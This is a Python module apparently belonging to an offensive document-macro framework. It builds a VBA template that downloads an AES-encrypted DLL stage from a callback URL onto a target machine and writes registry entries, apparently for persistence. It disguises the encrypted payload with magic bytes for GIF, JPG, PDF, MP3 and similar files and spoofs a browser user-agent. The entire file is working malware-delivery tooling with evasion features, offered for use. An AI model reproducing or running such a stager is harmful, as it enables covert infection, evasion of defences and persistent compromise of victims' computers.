
from lib.interfaces.module_interface import ModuleInterface
from lib.validators.files import isreadable
from lib.validators.generic import iswebaddress
from lib.handlers.generic import quotedstring
from base64 import b64encode


class Template(ModuleInterface):
    def __init__(self, templatePath, helpers):
        options = {}
        self.helpers = helpers
        self.randomkey = helpers.binary.getAESKey()
        options['aeskey'] = {
            "value": None,
            "required": False,
            "description": "AES key",
            "validator": None,
            "handler": quotedstring,
            "hidden": True
        }
        options['useragent'] = { 
            "value": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.74 Safari/537.36 Edg/79.0.309.43",
            "required": True,
            "description": "User-Agent string to use for callback",
            "validator": None,
            "handler": quotedstring
        }
        options['dest'] = { 
            "value": None,
            "required": True,
            "description": "Destination on target to save the file to",
            "validator": None,
            "handler": quotedstring
        }
        options['url'] = {
            "value": None,
            "required": True,
            "description": "Callback URL to download",
            "validator": iswebaddress,
            "handler": quotedstring
        }
        options['output_stagefile'] = {
            "value": None,
            "required": True,
            "description": "Output location on web host of encrypted stage file. Supported file extensions [.gif, .jpg, .jpeg, .pdf, .mp3, .ico, .bmp, .der]",
            "validator": None,
            "tab_complete": self.helpers.complete_path,
            "handler": None,
            "noinsert": True
        }
        options['input_stagefile'] = { #list of strings for expected options
            "value": None,
            "required": True,
            "description": "Location of file to encrypt and stage.",
            "validator": isreadable,
            "tab_complete": self.helpers.complete_path,
            "noinsert": True
        }
        options['registry_file'] = { #list of strings for expected options
            "value": None,
            "required": False,
            "description": "Location of file containing registry entries to add. (entries in format of ROOT_KEY,SUBKEY,VALUE_NAME,VALUE_TYPE,VALUE_DATA)",
            "validator": isreadable,
            "tab_complete": self.helpers.complete_path,
            "noinsert": True
        }
        options['registry_entries'] = { #list of strings for expected options
            "value": "",
            "required": False,
            "description": "The VBA Array initialization, e.g., Array(HKEY,'SubKey','ValueName',ValueType,ValueData), Array(...)",
            "validator": None,
            "handler": None,
            "hidden": True
        }
        super().__init__(templatePath, options)
    # end __init__

    def preprocess(self):
        # Set up the declares
        self.declares.add('Private Declare Function m_ExpandEnvironmentStrings Lib "kernel32" Alias "ExpandEnvironmentStringsA" (ByVal lpSrc As String, ByVal lpDst As String, ByVal nSize As Long) As Long')
        self.declares.add("""
Private Const HKEY_LOCAL_MACHINE = &H80000002
Private Const HKEY_USERS = &H80000003
Private Const HKEY_CURRENT_CONFIG = &H80000005
Private Const HKEY_CURRENT_USER = &H80000001
Private Const HKEY_CLASSES_ROOT = &H80000000
        """)
        self.declares.add("""
Private Const REG_SZ = 1
Private Const REG_BINARY = 3
Private Const REG_DWORD = 4
Private Const REG_EXPAND_SZ = 2
Private Const REG_MULTI_SZ = 7
        """)
        
        # Read in the registry entries and generate the VBA
        if self.options['registry_file']['value'] is not None:
            entries = ""
            with open(self.options['registry_file']['value'], 'r') as fd:
                entry = fd.readline()
                while entry:
                    entry = entry.strip(" \r\n\t")
                    if len(entry)>0:
                        entries += "Array("+entry+"),"
                    entry = fd.readline()
            entries = entries[:-1]
            self.options['registry_entries']['value']=entries
        
        # The AES key phrase
        self.options['aeskey']['value'] = self.randomkey.decode()
        
        # Check the output_stagefile type and url type
        file_type = self.options['output_stagefile']['value'].split('.')[-1]
        url_type = self.options['url']['value'].split('.')[-1]
        if file_type != url_type:
            print("[*] ERROR: file types do not match!")
            return False
        if file_type not in list(self.helpers.binary.magicbytes.keys()):
            print("[*] ERROR: file type not supported!")
            return False
    # end preprocess
    
    def postprocess(self):
        file_type = self.options['output_stagefile']['value'].split('.')[-1]
        payload = self.helpers.encode_dll(self.options['input_stagefile']['value'], file_type, self.randomkey)
        with open(self.options['output_stagefile']['value'], 'wb') as fp:
            fp.write(payload)
        print("    Wrote the {} byte, encrypted output_stagefile to {}".format(len(payload),self.options['output_stagefile']['value']))
    # end postprocess
